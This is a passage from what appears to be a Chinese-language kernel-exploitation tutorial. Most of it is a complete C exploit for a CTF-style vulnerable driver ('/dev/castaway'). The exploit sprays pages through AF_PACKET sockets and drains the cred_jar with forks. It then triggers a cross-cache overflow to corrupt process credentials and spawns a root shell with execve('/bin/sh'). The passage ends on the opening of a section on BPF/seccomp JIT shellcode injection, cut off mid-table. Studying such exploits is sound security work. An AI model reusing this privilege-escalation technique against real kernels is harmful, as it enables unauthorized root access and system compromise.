class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span>&#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALLOC 0xcafebabe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE 0xdeadbabe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EDIT 0xf00dbabe</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-type">int64_t</span> idx;<br>    <span class="hljs-type">uint64_t</span> size;<br>    <span class="hljs-type">char</span> *buf;<br>&#125;<span class="hljs-type">user_req_t</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tpacket_req</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">tpacket_versions</span> &#123;<br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FORK_SPRAY 320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNK_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ISO_SLAB_LIMIT 8</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_JAR_INITIAL_SPRAY 32</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INITIAL_PAGE_SPRAY 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FINAL_PAGE_SPRAY 30</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-type">bool</span> in_use;<br>    <span class="hljs-type">int</span> idx[ISO_SLAB_LIMIT];<br>&#125;full_page;<br><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">spray_cmd</span> &#123;<br>    ALLOC_PAGE,<br>    FREE_PAGE,<br>    EXIT_SPRAY,<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">spray_cmd</span> cmd;<br>    <span class="hljs-type">int32_t</span> idx;<br>&#125;<span class="hljs-type">ipc_req_t</span>;<br><br><span class="hljs-comment">/* Finally spray vulnurbility pages */</span><br>full_page isolation_pages[FINAL_PAGE_SPRAY] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> rootfd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> sprayfd_child[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> sprayfd_parent[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> socketfds[INITIAL_PAGE_SPRAY];<br><br><span class="hljs-function"><span class="hljs-type">int64_t</span> <span class="hljs-title">ioctl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> request, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> param)</span></span>&#123;<br>    <span class="hljs-type">long</span> result = <span class="hljs-built_in">syscall</span>(<span class="hljs-number">16</span>, fd, request, param);<br>    <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;ioctl on driver&quot;</span>);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int64_t</span> <span class="hljs-title">alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ioctl</span>(fd, ALLOC, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int64_t</span> <span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int64_t</span> idx, <span class="hljs-type">uint64_t</span> size, <span class="hljs-type">char</span>* buf)</span></span>&#123;<br>    <span class="hljs-type">user_req_t</span> req = &#123;.idx = idx, .size = size, .buf = buf&#125;;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ioctl</span>(fd, EDIT, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)&amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&lt;STAR PLATINUM, THE WORLD!&gt;&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">uid_t</span> uid, <span class="hljs-type">gid_t</span> gid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> temp;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-built_in">unshare</span>(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);     <span class="hljs-comment">//Create new namespace and get in</span><br>    temp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">write</span>(temp, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    <span class="hljs-built_in">close</span>(temp);<br>    temp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-built_in">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, uid);<br>    <span class="hljs-built_in">write</span>(temp, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    <span class="hljs-built_in">close</span>(temp);<br>    temp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-built_in">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, gid);<br>    <span class="hljs-built_in">write</span>(temp, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    <span class="hljs-built_in">close</span>(temp);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * __clone - clone syscall in /kernel/fork.c</span><br><span class="hljs-comment"> * @flags: clone flags</span><br><span class="hljs-comment"> * @dest: the ptr of the user_stack</span><br><span class="hljs-comment"> * */</span><br>__attribute__((naked)) <span class="hljs-type">pid_t</span> __clone(<span class="hljs-type">uint64_t</span> flags, <span class="hljs-type">void</span> *dest)<br>&#123;<br>    <span class="hljs-built_in">asm</span>(<span class="hljs-string">&quot;mov r15, rsi;&quot;</span><br>        <span class="hljs-string">&quot;xor rsi, rsi;&quot;</span><br>        <span class="hljs-string">&quot;xor rdx, rdx;&quot;</span><br>        <span class="hljs-string">&quot;xor r10, r10;&quot;</span><br>        <span class="hljs-string">&quot;xor r9, r9;&quot;</span><br>        <span class="hljs-string">&quot;mov rax, 56;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span><br>        <span class="hljs-string">&quot;cmp rax, 0;&quot;</span><br>        <span class="hljs-string">&quot;jl bad_end;&quot;</span><br>        <span class="hljs-string">&quot;jg good_end;&quot;</span><br>        <span class="hljs-string">&quot;jmp r15;&quot;</span><br>        <span class="hljs-string">&quot;bad_end:&quot;</span><br>        <span class="hljs-string">&quot;neg rax;&quot;</span><br>        <span class="hljs-string">&quot;ret;&quot;</span><br>        <span class="hljs-string">&quot;good_end:&quot;</span><br>        <span class="hljs-string">&quot;ret;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">timespec</span> timer = &#123;.tv_sec = <span class="hljs-number">1000000000</span>, .tv_nsec = <span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">char</span> throwaway;<br><span class="hljs-type">char</span> root[] = <span class="hljs-string">&quot;root\n&quot;</span>;<br><span class="hljs-type">char</span> binsh[] = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>;<br><span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br><br>__attribute__((naked)) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">check_and_wait</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">asm</span>(<br>        <span class="hljs-string">&quot;lea rax, [rootfd];&quot;</span><br>        <span class="hljs-string">&quot;mov edi, dword ptr [rax];&quot;</span><br>        <span class="hljs-string">&quot;lea rsi, [throwaway];&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 1;&quot;</span><br>        <span class="hljs-string">&quot;xor rax, rax;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//read(rootfd, throwaway, 1)</span><br>        <span class="hljs-string">&quot;mov rax, 102;&quot;</span>         <br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//getuid()</span><br>        <span class="hljs-string">&quot;cmp rax, 0;&quot;</span>           <span class="hljs-comment">// not root, goto finish</span><br>        <span class="hljs-string">&quot;jne finish;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, 1;&quot;</span><br>        <span class="hljs-string">&quot;lea rsi, [root];&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 5;&quot;</span><br>        <span class="hljs-string">&quot;mov rax, 1;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//write(1, root, 5)</span><br>        <span class="hljs-string">&quot;lea rdi, [binsh];&quot;</span><br>        <span class="hljs-string">&quot;lea rsi, [args];&quot;</span><br>        <span class="hljs-string">&quot;xor rdx, rdx;&quot;</span><br>        <span class="hljs-string">&quot;mov rax, 59;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//execve(&quot;/bin/sh&quot;, args, 0)</span><br>        <span class="hljs-string">&quot;finish:&quot;</span><br>        <span class="hljs-string">&quot;lea rdi, [timer];&quot;</span><br>        <span class="hljs-string">&quot;xor rsi, rsi;&quot;</span><br>        <span class="hljs-string">&quot;mov rax, 35;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//nanosleep()</span><br>        <span class="hljs-string">&quot;ret;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">just_wait</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1000000000</span>);<br>&#125;<br><br><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * alloc_pages_via_sock - page allocation primitive</span><br><span class="hljs-comment"> * @size: once order-* allocation in page level</span><br><span class="hljs-comment"> * @n: the times you want to allocate</span><br><span class="hljs-comment"> * Return: the new socket fd</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">alloc_pages_via_sock</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> size, <span class="hljs-type">uint32_t</span> n)</span></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">tpacket_req</span> req;<br>    <span class="hljs-type">int32_t</span> socketfd, version;<br>    <br>    <span class="hljs-comment">/* Create the AF_PACKET socket */</span><br>    socketfd = <span class="hljs-built_in">socket</span>(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span>(socketfd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;Create the AF_PACKET socket failed...&quot;</span>);<br>    &#125;<br><br>    version = TPACKET_V1;<br><br>    <span class="hljs-comment">/* Set the ring buffer version */</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">setsockopt</span>(socketfd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="hljs-built_in">sizeof</span>(version)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;setsocketopt PACKET_VETSION failed...&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">assert</span>(size % <span class="hljs-number">4096</span> == <span class="hljs-number">0</span>);   <span class="hljs-comment">//size must be the 4096x*</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = n;<br>    req.tp_frame_size = <span class="hljs-number">4096</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr)/req.tp_frame_size;<br>    <br>    <span class="hljs-comment">/* Allocate the PACKET_TX_RING type ring buffer */</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">setsockopt</span>(socketfd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-built_in">sizeof</span>(req)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;setsocketopt PACKET_TX_RING failed!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> socketfd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">spray_comm_handler</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">ipc_req_t</span> req;<br>    <span class="hljs-type">int32_t</span> result;<br><br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-built_in">read</span>(sprayfd_child[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-built_in">sizeof</span>(req));<br>        <span class="hljs-built_in">assert</span>(req.idx &lt; INITIAL_PAGE_SPRAY);<br>        <span class="hljs-keyword">if</span>(req.cmd == ALLOC_PAGE)&#123;<br>            socketfds[req.idx] = <span class="hljs-built_in">alloc_pages_via_sock</span>(<span class="hljs-number">4096</span>, <span class="hljs-number">1</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.cmd == FREE_PAGE)&#123;<br>            <span class="hljs-built_in">close</span>(socketfds[req.idx]);<br>        &#125;<br>        result = req.idx;<br>        <span class="hljs-built_in">write</span>(sprayfd_parent[<span class="hljs-number">1</span>], &amp;result, <span class="hljs-built_in">sizeof</span>(result));<br>    &#125;<span class="hljs-keyword">while</span>(req.cmd != EXIT_SPRAY);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">send_spray_cmd</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> spray_cmd cmd, <span class="hljs-type">int</span> idx)</span></span>&#123;<br>    <span class="hljs-type">ipc_req_t</span> req;<br>    <span class="hljs-type">int32_t</span> result;<br><br>    req.cmd = cmd;<br>    req.idx = idx;<br>    <span class="hljs-comment">/* write to child manager for cmd */</span><br>    <span class="hljs-built_in">write</span>(sprayfd_child[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-built_in">sizeof</span>(req));<br>    <span class="hljs-comment">/* read from parent pipe which just been writen by child manager */</span><br>    <span class="hljs-built_in">read</span>(sprayfd_parent[<span class="hljs-number">0</span>], &amp;result, <span class="hljs-built_in">sizeof</span>(result));<br>    <span class="hljs-built_in">assert</span>(result == idx);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">alloc_vuln_page</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, full_page *arr, <span class="hljs-type">int</span> page_idx)</span></span>&#123;<br>    <span class="hljs-built_in">assert</span>(!arr[page_idx].in_use);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ISO_SLAB_LIMIT; i++)&#123;<br>        <span class="hljs-type">long</span> result = <span class="hljs-built_in">alloc</span>(fd);<br>        <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;Allocation vuln page error...&quot;</span>);<br>        &#125;<br>        arr[page_idx].idx[i] = result;<br>    &#125;<br>    arr[page_idx].in_use = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">edit_vuln_page</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, full_page *arr, <span class="hljs-type">int</span> page_idx, <span class="hljs-type">uint8_t</span> *buf, <span class="hljs-type">size_t</span> sz)</span></span>&#123;<br>    <span class="hljs-built_in">assert</span>(arr[page_idx].in_use);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ISO_SLAB_LIMIT; i++)&#123;<br>        <span class="hljs-type">long</span> result = <span class="hljs-built_in">edit</span>(fd, arr[page_idx].idx[i], sz, buf);<br>        <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;edit error...&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span>&#123;<br><br>    <span class="hljs-built_in">info_log</span>(<span class="hljs-string">&quot;Step I: Open the vulnurability driver...&quot;</span>);<br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/castaway&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;Driver open failed!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">info_log</span>(<span class="hljs-string">&quot;Step II: Construct two pipe for communicating in those namespace...&quot;</span>);<br>    <span class="hljs-built_in">pipe</span>(sprayfd_child);<br>    <span class="hljs-built_in">pipe</span>(sprayfd_parent);<br><br>    <span class="hljs-built_in">info_log</span>(<span class="hljs-string">&quot;Step III: Setting up spray manager in separate namespace...&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!fork())&#123;<br>        <span class="hljs-built_in">unshare_setup</span>(<span class="hljs-built_in">getuid</span>(), <span class="hljs-built_in">getgid</span>());<br>        <span class="hljs-built_in">spray_comm_handler</span>();<br>    &#125;<br>    <span class="hljs-comment">/* For communicating with the fork later */</span><br>    <span class="hljs-built_in">pipe</span>(rootfd);<br>    <span class="hljs-type">char</span> evil[CHUNK_SIZE];<br>    <span class="hljs-built_in">memset</span>(evil, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(evil));<br>    <br>    <span class="hljs-built_in">info_log</span>(<span class="hljs-string">&quot;Step IV: Draining Start!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]draining cred_jar...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_JAR_INITIAL_SPRAY; i++)&#123;<br>        <span class="hljs-type">pid_t</span> result = fork();<br>        <span class="hljs-keyword">if</span>(!result)&#123;<br>            <span class="hljs-built_in">just_wait</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;fork limit...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]draining Buddysystem, of course order 0 :)&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; INITIAL_PAGE_SPRAY; i++)&#123;<br>        <span class="hljs-built_in">send_spray_cmd</span>(ALLOC_PAGE, i);<br>    &#125;<br>    <span class="hljs-comment">/* Free the medium one, of many in other words... */</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; INITIAL_PAGE_SPRAY; i += <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">send_spray_cmd</span>(FREE_PAGE, i);<br>    &#125; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FORK_SPRAY; i++)&#123;<br>        <span class="hljs-type">pid_t</span> result = __clone(CLONE_FLAGS, &amp;check_and_wait);<br>        <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;clone error...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; INITIAL_PAGE_SPRAY; i += <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">send_spray_cmd</span>(FREE_PAGE, i);<br>    &#125; <br> <br>    *(<span class="hljs-type">uint32_t</span> *)&amp;evil[CHUNK_SIZE - <span class="hljs-number">0x6</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Spraying cross cache overflow...&quot;</span>);   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FINAL_PAGE_SPRAY; i++)&#123;<br>        <span class="hljs-built_in">alloc_vuln_page</span>(fd, isolation_pages, i);<br>        <span class="hljs-built_in">edit_vuln_page</span>(fd, isolation_pages, i, evil, CHUNK_SIZE);<br>    &#125;<br>    <span class="hljs-built_in">write</span>(rootfd[<span class="hljs-number">1</span>], evil, FORK_SPRAY);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">10000</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="九、shellcode-injection"><a href="#九、shellcode-injection" class="headerlink" title="九、shellcode injection"></a>九、shellcode injection</h1><p>如题，就是shellcode注入，通常是利用bpf系统调用来进行，其全称为 <code>Berkeley Package Filter</code>，我们可以通过该系统调用设置 一定的选项来向内核当中写入可执行代码，我们可以通过该系统调用来为各进程往内核当中创建信息媒介，其中就可以向内和写入类似键值对的集合，除此之外我们向内和注入的代码也可以通过附着在某个进程之上来实现过滤器或者说实现日志的功能，详细学习资料可以参考安全客这位师傅的<a href="https://www.anquanke.com/post/id/263803">博客</a>，里面就Linux官方手册进行了翻译与讲解，后续也有相应实验来帮助理解，十分亲民</p><p>回到我们的利用当中，由于大部分情况下bpf系统调用需要我们在root权限下才可以使用，因此在我们提权的过程中基本可以告别bpf系统调用，但是也有其他系统调用实现了类似的功能，其中比较广为人知的就是prctl系统调用，也就是众多沙箱手法的一种，通过设置规则来过滤我们的系统调用，而查看源码可以发现它在某条链条上同bpf的后半部分调用是一致的，且都运用到了bpf汇编代码和jit编译技术，其中可以通过设置 <code>PR_SET_SECCOMP</code>来设置一段bpf代码为我们的过滤器，其中大致涉及的系统调用如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">sys_prctl<br>prctl_set_seccomp<br>seccomp_set_mode_filter<br>seccomp_prepare_user_filter<br>seccomp_prepare_filter<br>bpf_prog_create_from_user<br>bpf_prepare_filter<br>bpf_migrate_filter<br>bpf_prog_select_runtime<br>bpf_int_jit_compile<br>bpf_jit_binary_alloc<br>bpf_jit_alloc_exec<br></code></pre></td></tr></table></figure><p>这里的大致过程就是，首先我们调用prctl系统调用，这里传入我们的bpf程序，这里注意我们传入的需要时bpf形式的汇编代码，他会被传入到内核内存当中，然后由 <code>bpf_int_jit_compile</code>函数来进行JIT(just in time)编译存于内核，这里介绍一下如何利用其中的规则</p><p>这里首先需要介绍一下bpf汇编代码的格式：</p><p>原始的bpf汇编指令也被叫做 cBPF（class BPF），他的格式被存放在内核源码中</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Try and keep these values and structures similar to BSD, especially</span><br><span class="hljs-comment"> *the BPF code definitions which need to match so you can share filters</span><br><span class="hljs-comment"> */</span><br> <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_filter</span> &#123;<span class="hljs-comment">/* Filter block */</span><br>__<span class="hljs-type">u16</span>code;   <span class="hljs-comment">/* Actual filter code */</span><br>__<span class="hljs-type">u8</span>jt;<span class="hljs-comment">/* Jump true */</span><br>__<span class="hljs-type">u8</span>jf;<span class="hljs-comment">/* Jump false */</span><br>__<span class="hljs-type">u32</span>k;      <span class="hljs-comment">/* Generic multiuse field */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到其中的汇编代码code字段占2字节，中间是jump字段我们可以暂时不管，后面就是我们的多用字段，在我们注入漏洞当中，大多情况是将其设置为立即数字段（这里实际上bpf系统调用存在防御机制，那就是在函数 <code>bpf_jit_blind_constants()</code>当中添加的常数致盲机制，从而避免汇编代码中出现原立即数，但是即将涉及到的例题并未开启这一防御机制），这里说明该如何利用，设想一下下面这种情景</p><p>首先给出cBPF的基本操作码字段</p><figure class="highlight cpp"><table><tr><td 